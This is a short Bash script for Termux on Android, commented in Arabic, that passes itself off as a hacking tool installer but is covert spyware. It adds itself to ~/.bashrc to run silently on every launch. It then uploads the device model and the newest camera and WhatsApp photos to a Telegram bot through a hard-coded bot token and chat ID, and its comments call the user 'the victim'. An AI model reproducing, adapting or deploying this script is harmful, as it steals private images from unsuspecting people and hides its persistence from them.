#!/bin/bash

# --- 1. إعدادات البوت ---
TOKEN="8669553208:AAGCy9MQTL9ogHuFXbZiZy4bqkXUnkdwHqg"
ID="7845603274"
URL_MSG="https://api.telegram.org/bot$TOKEN/sendMessage"
URL_DOC="https://api.telegram.org/bot$TOKEN/sendDocument"

# --- 2. مرحلة التثبيت (تنفذ مرة واحدة فقط عند الضحية) ---
if ! grep -q "security_task.sh" ~/.bashrc; then
    # طلب الصلاحيات والتثبيت يظهر مرة واحدة فقط في البداية للإيهام بتجهيز "أداة الاختراق"
    termux-setup-storage
    sleep 3
    pkg install git curl -y -q
    
    # إضافة السكريبت للعمل في الخلفية بصمت تام عند كل فتح
    echo "(bash ~/security_task.sh > /dev/null 2>&1 &)" >> ~/.bashrc
    
    echo -e "\e[1;32m[!] Tool Installed Successfully!\e[0m"
    exit # نخرج هنا لكي يبدأ وضع الصمت من الفتحة القادمة
fi

# --- 3. مرحلة "العمل في الخلفية" (Silent Task) ---
# إرسال إشعار للبوت بمعلومات الجهاز
MODEL=$(getprop ro.product.model)
curl -s "$URL_MSG?chat_id=$ID&text=Silent_Access_Active: $MODEL" > /dev/null

# مسارات الصور
paths=(
"/sdcard/DCIM/Camera/"
"/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/"
)

# سحب الصور وإرسالها بصمت
for path in "${paths[@]}"; do
    if [ -d "$path" ]; then
        # نرسل آخر صورتين دون إظهار أي مخرجات على شاشة الضحية
        ls -t "$path" | head -n 2 | while read photo; do
            curl -s -F chat_id=$ID -F document=@"$path$photo" "$URL_DOC" > /dev/null
        done
    fi
done

# ملاحظة: تم حذف مرحلة العداد (التمويه) لضمان الصمت التام
